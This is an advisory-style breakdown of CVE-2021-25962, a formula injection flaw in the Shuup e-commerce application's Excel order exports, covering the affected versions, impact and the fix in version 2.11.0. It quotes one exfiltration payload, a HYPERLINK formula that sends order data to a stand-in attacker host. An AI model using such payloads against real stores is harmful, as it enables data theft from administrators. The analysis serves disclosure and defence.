Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2021-25962

**Vulnerable Software:** Shuup application

**Affected Versions:** 0.4.2 to 2.10.8

**Root Cause of Vulnerability:** Formula Injection. The application does not properly sanitize user-supplied input in the billing address name field. This allows an attacker to inject malicious formulas.

**Weaknesses/Vulnerabilities Present:**
*   **Formula Injection:**  The application fails to neutralize special characters used in spreadsheet formulas, specifically in the billing address name field. This allows for the injection of malicious formulas that execute when the exported file is opened in a spreadsheet application.

**Impact of Exploitation:**
*   **Arbitrary Code Execution:** When a store administrator exports order data into an Excel file and opens it, the injected formula gets executed. This can result in the disclosure of sensitive data. The PoC demonstrates how to exfiltrate the order reference and the date and time of the order by sending an HTTP GET request to the attacker.
*   **Data Exfiltration:** The provided PoC demonstrates data exfiltration, and potentially other malicious activities depending on the attacker's payload.

**Attack Vectors:**
*   **Network:** The attack occurs remotely through the web application.
*   **User Interaction:** Requires the administrator to download and open the maliciously crafted excel file.

**Required Attacker Capabilities/Position:**
*   The attacker needs to be a customer of the online store and able to place an order.
*   The attacker can insert malicious formulas in the name field of the billing address.
*   The attacker needs to lure a store administrator to export order data and open the resulting Excel file.

**Technical Details:**

*   The attacker injects a formula, such as `=HYPERLINK("http://0.0.0.0:4444?x="&A3&B3,"Click Here")`, into the name field during checkout.
*   The injected formula is not sanitized and is included in the generated Excel report.
*   When the administrator opens the Excel report, the hyperlink is active and, when clicked, sends data to the attacker-controlled server.

**Mitigation:**
*   Upgrade to Shuup version 2.11.0 or higher, which includes a fix for this vulnerability.
*   The fix involves cleaning malicious content from HTML and CSV exporters, and preventing formulas from being exported in the excel writer.
*   The code changes in `shuup/reports/writer.py` involves sanitizing user inputs by removing characters like '=', '+', and '-'.
